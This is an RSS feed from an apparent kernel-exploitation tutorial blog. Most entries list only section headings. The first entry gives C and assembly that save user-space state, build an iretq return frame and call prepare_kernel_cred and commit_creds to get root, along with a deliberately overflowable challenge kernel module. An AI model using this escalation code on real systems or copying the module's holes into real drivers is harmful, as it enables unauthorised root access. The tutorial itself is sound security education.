<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>kernel on Anvbis</title><link>https://anvbis.github.io/tags/kernel/</link><description>Recent content in kernel on Anvbis</description><generator>Hugo -- gohugo.io</generator><language>en-au</language><copyright>Anvbis</copyright><lastBuildDate>Mon, 31 Jan 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://anvbis.github.io/tags/kernel/index.xml" rel="self" type="application/rss+xml"/><item><title>Linux Kernel 0x07 :: Modprobe Path Overwrite</title><link>https://anvbis.github.io/posts/linux-kernel-7-modprobe-path/</link><pubDate>Mon, 31 Jan 2022 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/linux-kernel-7-modprobe-path/</guid><description>Table of Contents Modprobe Path Overview Overwriting Modprobe Path A Vulnerable Kernel Module Environment Setup Building the Exploit Escalating Privileges Modprobe Path Overview &amp;hellip;
Overwriting Modprobe Path &amp;hellip;
A Vulnerable kernel Module &amp;hellip;
Environment Setup &amp;hellip;
Building the Exploit &amp;hellip;
Escalating Privileges &amp;hellip;
Appendix Linux Kernel Exploitation Technique - Overwriting modprobe_path</description><content>&lt;h2 id="table-of-contents">Table of Contents&lt;/h2>
&lt;ol>
&lt;li>&lt;a href="#modprobe-path-overview">Modprobe Path Overview&lt;/a>&lt;/li>
&lt;li>&lt;a href="#overwriting-modprobe-path">Overwriting Modprobe Path&lt;/a>&lt;/li>
&lt;li>&lt;a href="#a-vulnerable-kernel-module">A Vulnerable Kernel Module&lt;/a>&lt;/li>
&lt;li>&lt;a href="#environment-setup">Environment Setup&lt;/a>&lt;/li>
&lt;li>&lt;a href="#building-the-exploit">Building the Exploit&lt;/a>&lt;/li>
&lt;li>&lt;a href="#escalating-privileges">Escalating Privileges&lt;/a>&lt;/li>
&lt;/ol>
&lt;h2 id="modprobe-path-overview">Modprobe Path Overview&lt;/h2>
&lt;p>&amp;hellip;&lt;/p>
&lt;h2 id="overwriting-modprobe-path">Overwriting Modprobe Path&lt;/h2>
&lt;p>&amp;hellip;&lt;/p>
&lt;h2 id="a-vulnerable-kernel-module">A Vulnerable kernel Module&lt;/h2>
&lt;p>&amp;hellip;&lt;/p>
&lt;h2 id="environment-setup">Environment Setup&lt;/h2>
&lt;p>&amp;hellip;&lt;/p>
&lt;h2 id="building-the-exploit">Building the Exploit&lt;/h2>
&lt;p>&amp;hellip;&lt;/p>
&lt;h2 id="escalating-privileges">Escalating Privileges&lt;/h2>
&lt;p>&amp;hellip;&lt;/p>
&lt;h2 id="appendix">Appendix&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/">Linux Kernel Exploitation Technique - Overwriting modprobe_path&lt;/a>&lt;/li>
&lt;/ul></content></item><item><title>Linux Kernel 0x06 :: Stack Pivot in the Kernel</title><link>https://anvbis.github.io/posts/linux-kernel-6-stack-pivot/</link><pubDate>Sun, 30 Jan 2022 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/linux-kernel-6-stack-pivot/</guid><description>Table of Contents A Vulnerable Kernel Module Encountering Limited Overflow Space Pivoting the Stack Building a Fake Stack Environment Setup Building the Exploit A Vulnerable Kernel Module &amp;hellip;
Encountering Limited Overflow Space &amp;hellip;
Pivoting the Stack &amp;hellip;
Building a Fake Stack &amp;hellip;
Environment Setup &amp;hellip;
Building the Exploit &amp;hellip;
Appendix Learning Linux Kernel Exploitation - Part 2</description><content>&lt;h2 id="table-of-contents">Table of Contents&lt;/h2>
&lt;ol>
&lt;li>&lt;a href="#a-vulnerable-kernel-module">A Vulnerable Kernel Module&lt;/a>&lt;/li>
&lt;li>&lt;a href="#encountering-limited-overflow-space">Encountering Limited Overflow Space&lt;/a>&lt;/li>
&lt;li>&lt;a href="#pivoting-the-stack">Pivoting the Stack&lt;/a>&lt;/li>
&lt;li>&lt;a href="#building-a-fake-stack">Building a Fake Stack&lt;/a>&lt;/li>
&lt;li>&lt;a href="#environment-setup">Environment Setup&lt;/a>&lt;/li>
&lt;li>&lt;a href="#building-the-exploit">Building the Exploit&lt;/a>&lt;/li>
&lt;/ol>
&lt;h2 id="a-vulnerable-kernel-module">A Vulnerable Kernel Module&lt;/h2>
&lt;p>&amp;hellip;&lt;/p>
&lt;h2 id="encountering-limited-overflow-space">Encountering Limited Overflow Space&lt;/h2>
&lt;p>&amp;hellip;&lt;/p>
&lt;h2 id="pivoting-the-stack">Pivoting the Stack&lt;/h2>
&lt;p>&amp;hellip;&lt;/p>
&lt;h2 id="building-a-fake-stack">Building a Fake Stack&lt;/h2>
&lt;p>&amp;hellip;&lt;/p>
&lt;h2 id="environment-setup">Environment Setup&lt;/h2>
&lt;p>&amp;hellip;&lt;/p>
&lt;h2 id="building-the-exploit">Building the Exploit&lt;/h2>
&lt;p>&amp;hellip;&lt;/p>
&lt;h2 id="appendix">Appendix&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://lkmidas.github.io/posts/20210128-linux-kernel-pwn-part-2/">Learning Linux Kernel Exploitation - Part 2&lt;/a>&lt;/li>
&lt;/ul></content></item><item><title>Linux Kernel 0x05 :: Bypass KASLR with Pointer Leak</title><link>https://anvbis.github.io/posts/linux-kernel-5-bypass-kaslr/</link><pubDate>Sat, 29 Jan 2022 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/linux-kernel-5-bypass-kaslr/</guid><description>Table of Contents Overview of Kernel Address-Space Layout Randomization Bypass Techniques A Vulnerable Kernel Module Leaking a Kernel Pointer Building an Escalation Chain Environment Setup Building the Exploit Overview of Kernel Address-Space Layout Randomization &amp;hellip;
Bypass Techniques &amp;hellip;
A Vulnerable Kernel Module &amp;hellip;
Leaking a Kernel Pointer &amp;hellip;
Building an Escalation Chain &amp;hellip;
Environment Setup &amp;hellip;
Building the Exploit &amp;hellip;
Appendix Learning Linux Kernel Exploitation - Part 2</description><content>&lt;h2 id="table-of-contents">Table of Contents&lt;/h2>
&lt;ol>
&lt;li>&lt;a href="#overview-of-kernel-address-space-layout-randomization">Overview of Kernel Address-Space Layout Randomization&lt;/a>&lt;/li>
&lt;li>&lt;a href="#bypass-techniques">Bypass Techniques&lt;/a>&lt;/li>
&lt;li>&lt;a href="#a-vulnerable-kernel-module">A Vulnerable Kernel Module&lt;/a>&lt;/li>
&lt;li>&lt;a href="#leaking-a-kernel-pointer">Leaking a Kernel Pointer&lt;/a>&lt;/li>
&lt;li>&lt;a href="#building-an-escalation-chain">Building an Escalation Chain&lt;/a>&lt;/li>
&lt;li>&lt;a href="#environment-setup">Environment Setup&lt;/a>&lt;/li>
&lt;li>&lt;a href="#building-the-exploit">Building the Exploit&lt;/a>&lt;/li>
&lt;/ol>
&lt;h2 id="overview-of-kernel-address-space-layout-randomization">Overview of Kernel Address-Space Layout Randomization&lt;/h2>
&lt;p>&amp;hellip;&lt;/p>
&lt;h2 id="bypass-techniques">Bypass Techniques&lt;/h2>
&lt;p>&amp;hellip;&lt;/p>
&lt;h2 id="a-vulnerable-kernel-module">A Vulnerable Kernel Module&lt;/h2>
&lt;p>&amp;hellip;&lt;/p>
&lt;h2 id="leaking-a-kernel-pointer">Leaking a Kernel Pointer&lt;/h2>
&lt;p>&amp;hellip;&lt;/p>
&lt;h2 id="building-an-escalation-chain">Building an Escalation Chain&lt;/h2>
&lt;p>&amp;hellip;&lt;/p>
&lt;h2 id="environment-setup">Environment Setup&lt;/h2>
&lt;p>&amp;hellip;&lt;/p>
&lt;h2 id="building-the-exploit">Building the Exploit&lt;/h2>
&lt;p>&amp;hellip;&lt;/p>
&lt;h2 id="appendix">Appendix&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://lkmidas.github.io/posts/20210128-linux-kernel-pwn-part-2/">Learning Linux Kernel Exploitation - Part 2&lt;/a>&lt;/li>
&lt;/ul></content></item><item><title>Linux Kernel 0x04 :: Bypass KPTI with Trampoline</title><link>https://anvbis.github.io/posts/linux-kernel-4-bypass-kpti/</link><pubDate>Fri, 28 Jan 2022 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/linux-kernel-4-bypass-kpti/</guid><description>Table of Contents Overview of Kernel Page-Table Isolation The KPTI Trampoline A Vulnerable Kernel Module Building an Escalation Chain Environment Setup Building the Exploit Overview of Kernel Page-Table Isolation &amp;hellip;
The KPTI Trampoline &amp;hellip;
A Vulnerable Kernel Module &amp;hellip;
Building an Escalation Chain &amp;hellip;
Environment Setup &amp;hellip;
Building the Exploit &amp;hellip;
Appendix Learning Linux Kernel Exploitation - Part 2</description><content>&lt;h2 id="table-of-contents">Table of Contents&lt;/h2>
&lt;ol>
&lt;li>&lt;a href="#overview-of-kernel-page-table-isolation">Overview of Kernel Page-Table Isolation&lt;/a>&lt;/li>
&lt;li>&lt;a href="#the-kpti-trampoline">The KPTI Trampoline&lt;/a>&lt;/li>
&lt;li>&lt;a href="#a-vulnerable-kernel-module">A Vulnerable Kernel Module&lt;/a>&lt;/li>
&lt;li>&lt;a href="#building-an-escalation-chain">Building an Escalation Chain&lt;/a>&lt;/li>
&lt;li>&lt;a href="#environment-setup">Environment Setup&lt;/a>&lt;/li>
&lt;li>&lt;a href="#building-the-exploit">Building the Exploit&lt;/a>&lt;/li>
&lt;/ol>
&lt;h2 id="overview-of-kernel-page-table-isolation">Overview of Kernel Page-Table Isolation&lt;/h2>
&lt;p>&amp;hellip;&lt;/p>
&lt;h2 id="the-kpti-trampoline">The KPTI Trampoline&lt;/h2>
&lt;p>&amp;hellip;&lt;/p>
&lt;h2 id="a-vulnerable-kernel-module">A Vulnerable Kernel Module&lt;/h2>
&lt;p>&amp;hellip;&lt;/p>
&lt;h2 id="building-an-escalation-chain">Building an Escalation Chain&lt;/h2>
&lt;p>&amp;hellip;&lt;/p>
&lt;h2 id="environment-setup">Environment Setup&lt;/h2>
&lt;p>&amp;hellip;&lt;/p>
&lt;h2 id="building-the-exploit">Building the Exploit&lt;/h2>
&lt;p>&amp;hellip;&lt;/p>
&lt;h2 id="appendix">Appendix&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://lkmidas.github.io/posts/20210128-linux-kernel-pwn-part-2/">Learning Linux Kernel Exploitation - Part 2&lt;/a>&lt;/li>
&lt;/ul></content></item><item><title>Linux Kernel 0x03 :: Bypass SMAP with SIGSEGV Handler</title><link>https://anvbis.github.io/posts/linux-kernel-3-bypass-smep/</link><pubDate>Thu, 27 Jan 2022 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/linux-kernel-3-bypass-smep/</guid><description>Table of Contents Overview of Supervisor Mode Access Prevention SMAP Bypass Techniques A Vulnerable Kernel Module Building a Complete Escalation Chain Environment Setup Building the Exploit Overview of Supervisor Mode Access Prevention &amp;hellip;
SMAP Bypass Techniques &amp;hellip;
A Vulnerable Kernel Module &amp;hellip;
Building a Complete Escalation Chain &amp;hellip;
Environment Setup &amp;hellip;
Building the Exploit &amp;hellip;
Appendix Learning Linux Kernel Exploitation - Part 2</description><content>&lt;h2 id="table-of-contents">Table of Contents&lt;/h2>
&lt;ol>
&lt;li>&lt;a href="#overview-of-supervisor-mode-access-prevention">Overview of Supervisor Mode Access Prevention&lt;/a>&lt;/li>
&lt;li>&lt;a href="#smap-bypass-techniques">SMAP Bypass Techniques&lt;/a>&lt;/li>
&lt;li>&lt;a href="#a-vulnerable-kernel-module">A Vulnerable Kernel Module&lt;/a>&lt;/li>
&lt;li>&lt;a href="#building-a-complete-escalation-chain">Building a Complete Escalation Chain&lt;/a>&lt;/li>
&lt;li>&lt;a href="#environment-setup">Environment Setup&lt;/a>&lt;/li>
&lt;li>&lt;a href="#building-the-exploit">Building the Exploit&lt;/a>&lt;/li>
&lt;/ol>
&lt;h2 id="overview-of-supervisor-mode-access-prevention">Overview of Supervisor Mode Access Prevention&lt;/h2>
&lt;p>&amp;hellip;&lt;/p>
&lt;h2 id="smap-bypass-techniques">SMAP Bypass Techniques&lt;/h2>
&lt;p>&amp;hellip;&lt;/p>
&lt;h2 id="a-vulnerable-kernel-module">A Vulnerable Kernel Module&lt;/h2>
&lt;p>&amp;hellip;&lt;/p>
&lt;h2 id="building-a-complete-escalation-chain">Building a Complete Escalation Chain&lt;/h2>
&lt;p>&amp;hellip;&lt;/p>
&lt;h2 id="environment-setup">Environment Setup&lt;/h2>
&lt;p>&amp;hellip;&lt;/p>
&lt;h2 id="building-the-exploit">Building the Exploit&lt;/h2>
&lt;p>&amp;hellip;&lt;/p>
&lt;h2 id="appendix">Appendix&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://lkmidas.github.io/posts/20210128-linux-kernel-pwn-part-2/">Learning Linux Kernel Exploitation - Part 2&lt;/a>&lt;/li>
&lt;/ul></content></item><item><title>Linux Kernel 0x02 :: Bypass SMEP with CR4 Overwrite</title><link>https://anvbis.github.io/posts/linux-kernel-2-bypass-smep/</link><pubDate>Wed, 26 Jan 2022 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/linux-kernel-2-bypass-smep/</guid><description>Table of Contents Overview of Supervisor Mode Execution Protection Overwriting the Control Register A Vulnerable Kernel Module Building a ROP Chain Environment Setup Building the Exploit Overview of Supervisor Mode Execution Protection &amp;hellip;
Overwriting the Control Register &amp;hellip;
A Vulnerable Kernel Module &amp;hellip;
Building a ROP Chain &amp;hellip;
Environment Setup &amp;hellip;
Building the Exploit &amp;hellip;
Appendix Learning Linux Kernel Exploitation - Part 2</description><content>&lt;h2 id="table-of-contents">Table of Contents&lt;/h2>
&lt;ol>
&lt;li>&lt;a href="#overview-of-supervisor-mode-execution-protection">Overview of Supervisor Mode Execution Protection&lt;/a>&lt;/li>
&lt;li>&lt;a href="#overwriting-the-control-register">Overwriting the Control Register&lt;/a>&lt;/li>
&lt;li>&lt;a href="#a-vulnerable-kernel-module">A Vulnerable Kernel Module&lt;/a>&lt;/li>
&lt;li>&lt;a href="#building-a-rop-chain">Building a ROP Chain&lt;/a>&lt;/li>
&lt;li>&lt;a href="#environment-setup">Environment Setup&lt;/a>&lt;/li>
&lt;li>&lt;a href="#building-the-exploit">Building the Exploit&lt;/a>&lt;/li>
&lt;/ol>
&lt;h2 id="overview-of-supervisor-mode-execution-protection">Overview of Supervisor Mode Execution Protection&lt;/h2>
&lt;p>&amp;hellip;&lt;/p>
&lt;h2 id="overwriting-the-control-register">Overwriting the Control Register&lt;/h2>
&lt;p>&amp;hellip;&lt;/p>
&lt;h2 id="a-vulnerable-kernel-module">A Vulnerable Kernel Module&lt;/h2>
&lt;p>&amp;hellip;&lt;/p>
&lt;h2 id="building-a-rop-chain">Building a ROP Chain&lt;/h2>
&lt;p>&amp;hellip;&lt;/p>
&lt;h2 id="environment-setup">Environment Setup&lt;/h2>
&lt;p>&amp;hellip;&lt;/p>
&lt;h2 id="building-the-exploit">Building the Exploit&lt;/h2>
&lt;p>&amp;hellip;&lt;/p>
&lt;h2 id="appendix">Appendix&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://lkmidas.github.io/posts/20210128-linux-kernel-pwn-part-2/">Learning Linux Kernel Exploitation - Part 2&lt;/a>&lt;/li>
&lt;/ul></content></item><item><title>Linux Kernel 0x01 :: Return to User-space</title><link>https://anvbis.github.io/posts/linux-kernel-1-ret2usr/</link><pubDate>Tue, 25 Jan 2022 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/linux-kernel-1-ret2usr/</guid><description>Table of Contents User-space vs. Kernel-space Return to User-space Overview Saving the Initial State Restoring the Initial State Escalating Privileges in the Kernel A Vulnerable Kernel Module Exploiting the Kernel Module Environment Setup Building the Exploit User-space vs. Kernel-space &amp;hellip;
Return to User-space Overview &amp;hellip;
Saving the Initial State Before we can begin exploitation we will need to find some way to save the current user-space state. This is done as the iretq instruction will use the information saved below in order to return to user-space.</description><content>&lt;h2 id="table-of-contents">Table of Contents&lt;/h2>
&lt;ol>
&lt;li>&lt;a href="#user-space-vs-kernel-space">User-space vs. Kernel-space&lt;/a>&lt;/li>
&lt;li>&lt;a href="#return-to-user-space-overview">Return to User-space Overview&lt;/a>&lt;/li>
&lt;li>&lt;a href="#saving-the-initial-state">Saving the Initial State&lt;/a>&lt;/li>
&lt;li>&lt;a href="#restoring-the-initial-state">Restoring the Initial State&lt;/a>&lt;/li>
&lt;li>&lt;a href="#escalating-privileges-in-the-kernel">Escalating Privileges in the Kernel&lt;/a>&lt;/li>
&lt;li>&lt;a href="#a-vulnerable-kernel-module">A Vulnerable Kernel Module&lt;/a>&lt;/li>
&lt;li>&lt;a href="#exploiting-the-kernel-module">Exploiting the Kernel Module&lt;/a>&lt;/li>
&lt;li>&lt;a href="#environment-setup">Environment Setup&lt;/a>&lt;/li>
&lt;li>&lt;a href="#building-the-exploit">Building the Exploit&lt;/a>&lt;/li>
&lt;/ol>
&lt;h2 id="user-space-vs-kernel-space">User-space vs. Kernel-space&lt;/h2>
&lt;p>&amp;hellip;&lt;/p>
&lt;h2 id="return-to-user-space-overview">Return to User-space Overview&lt;/h2>
&lt;p>&amp;hellip;&lt;/p>
&lt;h2 id="saving-the-initial-state">Saving the Initial State&lt;/h2>
&lt;p>Before we can begin exploitation we will need to find some way to save the current user-space state. This is done as the &lt;code>iretq&lt;/code> instruction will use the information saved below in order to return to user-space.&lt;/p>
&lt;p>We save the required registers with the assembly code below in order to build our &lt;code>iret&lt;/code> frame to later exit kernel-space.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> save_ss, save_sp, save_rf, save_cs;
&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">save_user_space&lt;/span>()
{
&lt;span style="color:#75715e">/* save user-space */&lt;/span>
__asm__(
&lt;span style="color:#e6db74">&amp;#34;.intel_syntax noprefix;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;mov save_ss, ss;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;mov save_sp, rsp;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;pushf;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;pop save_rf;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;mov save_cs, cs;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;.att_syntax;&amp;#34;&lt;/span>
);
}
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="restoring-the-initial-state">Restoring the Initial State&lt;/h2>
&lt;p>In order to restore the initial state and return to user-space we require two instructions, &lt;code>swapgs&lt;/code> and &lt;code>iretq&lt;/code>. In x86_64 systems the &lt;code>swapgs&lt;/code> instruction must be made before the &lt;code>iretq&lt;/code> instruction as it swaps the &lt;code>gs&lt;/code> register between kernel-mode and user-mode.&lt;/p>
&lt;p>We next build our &lt;code>iret&lt;/code> frame, containing the information required to return to user-space by pushing our saved user-space registers onto the top of the stack. Finally we make our &lt;code>iretq&lt;/code> instruction to return from kernel-space.&lt;/p>
&lt;p>Note: At the very top of our &lt;code>iret&lt;/code> frame we put the address we want to return to.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">load_user_space&lt;/span>(&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> target)
{
&lt;span style="color:#75715e">/* return to user-space */&lt;/span>
__asm__(
&lt;span style="color:#e6db74">&amp;#34;.intel_syntax noprefix;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;swapgs;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;mov r15, save_ss;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;push r15;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;mov r15, save_sp;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;push r15;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;mov r15, save_rf;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;push r15;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;mov r15, save_cs;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;push r15;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;mov r15, %[rip];&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;push r15;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;iretq;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;.att_syntax;&amp;#34;&lt;/span>
&lt;span style="color:#f92672">:&lt;/span> [rip] &lt;span style="color:#e6db74">&amp;#34;=&amp;amp;r&amp;#34;&lt;/span> (target)
);
}
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="escalating-privileges-in-the-kernel">Escalating Privileges in the Kernel&lt;/h2>
&lt;p>Escalating privileges inside kernel-space is done via two function calls, &lt;code>prepare_kernel_cred&lt;/code> and &lt;code>commit_creds&lt;/code>.&lt;/p>
&lt;p>The &lt;code>prepare_kernel_cred&lt;/code> function call creates a credentials struct for whatever uid is provided to it (this will almost always be &amp;lsquo;0&amp;rsquo;, for the root user). The &lt;code>commit_creds&lt;/code> function call takes whatever credentials struct is provided to it and applies those privileges to the current user.&lt;/p>
&lt;p>We can find the address (in kernel-space) of both these functions by reading the &lt;code>/proc/kallsyms&lt;/code> file.&lt;/p>
&lt;pre>&lt;code>/ # cat /proc/kallsyms | grep prepare_kernel_cred
ffffffff810881c0 T prepare_kernel_cred
/ # cat /proc/kallsyms | grep commit_creds
ffffffff81087e80 T commit_creds
&lt;/code>&lt;/pre>&lt;p>Using the addresses we found earlier, we can write a bit of assembly that escalates our privileges to that of the root user.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-asm" data-lang="asm">&lt;span style="color:#a6e22e">xor&lt;/span> &lt;span style="color:#66d9ef">rdi&lt;/span>, &lt;span style="color:#66d9ef">rdi&lt;/span>
&lt;span style="color:#a6e22e">movabs&lt;/span> &lt;span style="color:#66d9ef">rbx&lt;/span>, &lt;span style="color:#ae81ff">0xffffffff810881c0&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">//&lt;/span> &lt;span style="color:#66d9ef">prepare_kernel_cred&lt;/span>
&lt;span style="color:#a6e22e">call&lt;/span> &lt;span style="color:#66d9ef">rbx&lt;/span>
&lt;span style="color:#a6e22e">movabs&lt;/span> &lt;span style="color:#66d9ef">rbx&lt;/span>, &lt;span style="color:#ae81ff">0xffffffff81087e80&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">//&lt;/span> &lt;span style="color:#66d9ef">commit_creds&lt;/span>
&lt;span style="color:#a6e22e">mov&lt;/span> &lt;span style="color:#66d9ef">rdi&lt;/span>, &lt;span style="color:#66d9ef">rax&lt;/span>
&lt;span style="color:#a6e22e">call&lt;/span> &lt;span style="color:#66d9ef">rbx&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Let&amp;rsquo;s place this inside a function so we can easily use it within our final exploit.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">escalate_privileges&lt;/span>()
{
&lt;span style="color:#75715e">/* escalate privileges */&lt;/span>
__asm__(
&lt;span style="color:#e6db74">&amp;#34;.intel_syntax noprefix;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;xor rdi, rdi;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;movabs rbx, 0xffffffff810881c0;&amp;#34;&lt;/span> &lt;span style="color:#75715e">// prepare_kernel_cred
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#e6db74">&amp;#34;call rbx;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;movabs rbx, 0xffffffff81087e80;&amp;#34;&lt;/span> &lt;span style="color:#75715e">// commit_creds
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#e6db74">&amp;#34;mov rdi, rax;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;call rbx;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;.att_syntax;&amp;#34;&lt;/span>
);
&lt;span style="color:#75715e">/* return to user-space */&lt;/span>
load_user_space(&lt;span style="color:#75715e">/* target return address */&lt;/span>);
}
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="a-vulnerable-kernel-module">A Vulnerable Kernel Module&lt;/h2>
&lt;p>&amp;hellip;&lt;/p>
&lt;p>&lt;a href="https://anvbis.github.io/files/linux-kernel/1/challenge.c">challenge.c&lt;/a>&lt;/p>
&lt;div class="collapsable-code">
&lt;input id="1" type="checkbox" checked />
&lt;label for="1">
&lt;span class="collapsable-code__language">c&lt;/span>
&lt;span class="collapsable-code__title">challenge.c&lt;/span>
&lt;span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide">&lt;/span>
&lt;/label>
&lt;pre class="language-c" >&lt;code>
#include &amp;lt;linux/kernel.h&amp;gt;
#include &amp;lt;linux/module.h&amp;gt;
#include &amp;lt;linux/fs.h&amp;gt;
#include &amp;lt;linux/proc_fs.h&amp;gt;
#include &amp;lt;linux/uaccess.h&amp;gt;
MODULE_LICENSE(&amp;#34;GPL&amp;#34;);
char out[256];
static ssize_t challenge_read(struct file *fp, char *buf, size_t len, loff_t *off)
{
char tmp[128];
memcpy(out, tmp, len);
return copy_to_user(buf, out, len);
}
static ssize_t challenge_write(struct file *fp, const char *buf, size_t len, loff_t *off)
{
char tmp[128];
if (copy_from_user(out, buf, len))
return -EINVAL;
memcpy(tmp, out, len);
return 0;
}
static int challenge_open(struct inode *inode, struct file *fp)
{
return 0;
}
static int challenge_release(struct inode *inode, struct file *fp)
{
return 0;
}
static struct file_operations fops = {
.read = challenge_read,
.write = challenge_write,
.open = challenge_open,
.release = challenge_release
};
struct proc_dir_entry *proc_entry;
int init_module(void)
{
proc_entry = proc_create(&amp;#34;challenge&amp;#34;, 0666, NULL, &amp;amp;fops);
return 0;
}
void cleanup_module(void)
{
if (proc_entry) {
proc_remove(proc_entry);
}
}
&lt;/code>&lt;/pre>
&lt;/div>
&lt;p>&amp;hellip;&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">static&lt;/span> ssize_t &lt;span style="color:#a6e22e">challenge_read&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> file &lt;span style="color:#f92672">*&lt;/span>fp, &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>buf, size_t len, loff_t &lt;span style="color:#f92672">*&lt;/span>off)
{
&lt;span style="color:#66d9ef">char&lt;/span> tmp[&lt;span style="color:#ae81ff">128&lt;/span>];
memcpy(out, tmp, len);
&lt;span style="color:#66d9ef">return&lt;/span> copy_to_user(buf, out, len);
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&amp;hellip;&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">static&lt;/span> ssize_t &lt;span style="color:#a6e22e">challenge_write&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> file &lt;span style="color:#f92672">*&lt;/span>fp, &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>buf, size_t len, loff_t &lt;span style="color:#f92672">*&lt;/span>off)
{
&lt;span style="color:#66d9ef">char&lt;/span> tmp[&lt;span style="color:#ae81ff">128&lt;/span>];
&lt;span style="color:#66d9ef">if&lt;/span> (copy_from_user(out, buf, len))
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#f92672">-&lt;/span>EINVAL;
memcpy(tmp, out, len);
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
}
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="exploiting-the-kernel-module">Exploiting the Kernel Module&lt;/h2>
&lt;p>&amp;hellip;&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;assert.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
